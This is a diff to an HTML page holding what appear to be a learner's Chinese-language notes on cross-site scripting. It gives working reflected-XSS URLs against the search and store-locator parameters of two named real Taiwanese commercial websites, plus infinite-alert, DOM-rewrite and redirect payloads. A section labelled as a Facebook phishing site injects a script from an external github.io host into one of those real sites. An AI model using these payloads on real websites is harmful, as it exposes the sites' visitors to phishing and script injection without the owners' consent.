@@ -102,48 +102,51 @@
     <div class="note">
         <textarea>
             [中華機械-搜尋頁面]
-            https://www.capitalmachinery.com.tw/
-            https://www.capitalmachinery.com.tw/search-result.php?keyword=
-            
-            [清心福全-門市據點]
-            https://www.chingshin.tw/
-            https://www.chingshin.tw/store.php/?city=
-            
-            --------------------------------------------------------------------------
-            [反射型XSS] alert彈出
-            <script>alert('OKOK')</script>
-            https://www.capitalmachinery.com.tw/search-result.php?keyword=<script>alert('OKOK')</script>
-            https://www.chingshin.tw/store.php/?city=<script>alert('OKOK')</script>
-            
-            --------------------------------------------------------------------------
-            [儲存型XSS] 無限alert彈出
-            while(1){
-                alert('OK');
-            }
-            https://xss-game.appspot.com/level2/frame
-            
-            <img src="" onerror="while(1){alert('OK');}">
-            
-            --------------------------------------------------------------------------
-            [DOM型XSS]
-             1.編寫原始 HTML
-            <script>
-            window.onload = function(){ 
-            document.write('TEXT')
-            }
-            </script>
-            
-             2.直接修改DOM 修改navbar導覽列
-            <script>
-            document.getElementById('mainNav').style.background='yellow';
-            </script>
-            
-             3.重定向document網址
-            <script>
-            document.location='https://www.google.com'
-            </script>
-            
-            
+https://www.capitalmachinery.com.tw/
+https://www.capitalmachinery.com.tw/search-result.php?keyword=
+
+[清心福全-門市據點]
+https://www.chingshin.tw/
+https://www.chingshin.tw/store.php/?city=
+
+--------------------------------------------------------------------------
+[反射型XSS] alert彈出
+<script>alert('OKOK')</script>
+https://www.capitalmachinery.com.tw/search-result.php?keyword=<script>alert('OKOK')</script>
+https://www.chingshin.tw/store.php/?city=<script>alert('OKOK')</script>
+
+--------------------------------------------------------------------------
+[儲存型XSS] 無限alert彈出
+while(1){
+    alert('OK');
+}
+https://xss-game.appspot.com/level2/frame
+
+<img src="" onerror="while(1){alert('OK');}">
+
+--------------------------------------------------------------------------
+[DOM型XSS]
+ 1.編寫原始 HTML
+<script>
+window.onload = function(){ 
+document.write('TEXT')
+}
+</script>
+
+ 2.直接修改DOM 修改navbar導覽列
+<script>
+document.getElementById('mainNav').style.background='yellow';
+</script>
+
+ 3.重定向document網址
+<script>
+document.location='https://www.google.com'
+</script>
+
+--------------------------------------------------------------------------
+釣魚FB網站
+<script src='https://lzk-test.github.io/link.js'></script>
+https://www.chingshin.tw/store.php/?city=<script src='https://lzk-test.github.io/link.js'></script>
         </textarea>
     </div>
 </body>
